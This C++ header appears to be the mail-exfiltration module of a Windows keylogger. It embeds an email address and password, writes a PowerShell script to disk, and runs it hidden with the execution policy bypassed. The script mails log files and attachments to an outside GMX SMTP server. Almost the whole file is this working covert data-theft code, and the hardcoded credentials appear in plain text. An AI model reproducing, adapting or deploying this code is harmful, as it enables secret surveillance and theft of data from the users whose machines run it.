#ifndef SENDMAIL_H
#define SENDMAIL_H

#include <fstream>
#include <vector>
#include "windows.h"
#include "IO.h"
#include "Timer.h"
#include "Helper.h"

#define SCRIPT_NAME "sm.ps1"

namespace Mail
{
    #define X_EM_FROM "78c78aa7s1opaas@gmx.com"
    #define X_EM_PASS "7d8ascyber7kjsa*"

const std::string &PowerShellScript = "Param([String]$Att,[String]$Subj,[String]$Body)\nFunction Send-Email{\n\tParam (\n\t\t[Parameter(`\n\t\t\tMandatory=$true)]\n\t\t[String]$From,\n\t\t[Parameter(`\n\t\t\tMandatory=$true)]\n\t\t[String]$Pass)\n\t$credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)\n\ttry\n\t{\n\t\tsend-mailmessage -from $From -to $From -subject $Subj -body $Body -Attachment $Att -smtpServer \"mail.gmx.com\" -port 587 -credential $credentials -usessl\n\t\texit 7;\n\t}\n\tcatch\n\t{\n\t\texit 3;\n\t}\n}\nSend-EMail -From \"" + std::string (X_EM_FROM) + "\" -Pass \"" + std::string (X_EM_PASS) + "\"";

#undef X_EM_FROM
#undef X_EM_PASS

    std::string StringReplace(std::string s, const std::string &what, const std::string &with)
    {
        if(what.empty())
            return s;
        size_t sp = 0;

        while((sp = s.find(what, sp)) != std::string::npos)
            s.replace(sp, what.length(), with), sp += with.length();
        return s;
    }

    bool CheckFileExists( const std::string &f)
    {
        std::ifstream file (f);
        return (bool)file;
    }

    bool CreateScript()
    {
        std::ofstream script(IO::GetOurPath(true) + std::string(SCRIPT_NAME));

        if(!script)
            return false;
        script << PowerShellScript;

        if(!script)
            return false;

        script.close();

        return true;
    }

    Timer m_timer;

    int SendMail(const std::string &subject, const std::string &body, const std::string &attachments)
    {
        bool ok;

        ok = IO::MKDir(IO::GetOurPath(true));
        if(!ok)
            return -1;
        std::string scr_path = IO::GetOurPath(true) + std::string(SCRIPT_NAME);
        if(!CheckFileExists(scr_path))
            ok = CreateScript();
        if(!ok)
            return -2;


        std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" -Subj \""
                            + StringReplace(subject, "\"", "\\\"") +
                            "\" -Body \""
                            + StringReplace(body, "\"", "\\\"") +
                            "\" -Att \"" + attachments + "\"";

        Helper::WriteAppLog("ANALYSIS 0: " + param);

        SHELLEXECUTEINFO ShExecInfo = {0};
        ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
        ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
        ShExecInfo.hwnd = NULL;
        ShExecInfo.lpVerb = "open";
        ShExecInfo.lpFile = "powershell";
        ShExecInfo.lpParameters = param.c_str();
        ShExecInfo.lpDirectory = NULL;
        ShExecInfo.nShow = SW_HIDE;
        ShExecInfo.hInstApp = NULL;

        ok = (bool)ShellExecuteEx(&ShExecInfo);
        if(!ok)
            return -3;
        WaitForSingleObject(ShExecInfo.hProcess, 7000);
        DWORD exit_code = 100;

        GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);

        m_timer.SetFunction([&]()
        {
            WaitForSingleObject(ShExecInfo.hProcess, 60000);
            GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
            if((int)exit_code == STILL_ACTIVE)
            {
                TerminateProcess(ShExecInfo.hProcess, 100);
            }
            Helper::WriteAppLog("<From SendMail> Return code: " + Helper::ToString((int)exit_code));

        });

        m_timer.RepeatCount(1L);
        m_timer.SetInterval(10L);
        m_timer.Start(true);
        return (int)exit_code;
    }

    int SendMail(const std::string &subject, const std::string &body, const std::vector<std::string> &att)
    {
        std::string attachments = "";
        if(att.size() == 1U)
        {
            attachments = att.at(0);
        }
        else
        {
            for(const auto &v : att)
                attachments += v + "::";
            attachments = attachments.substr(0, attachments.length() - 2);
        }
        return SendMail(subject, body, attachments);
    }
}
#endif // SENDMAIL_H
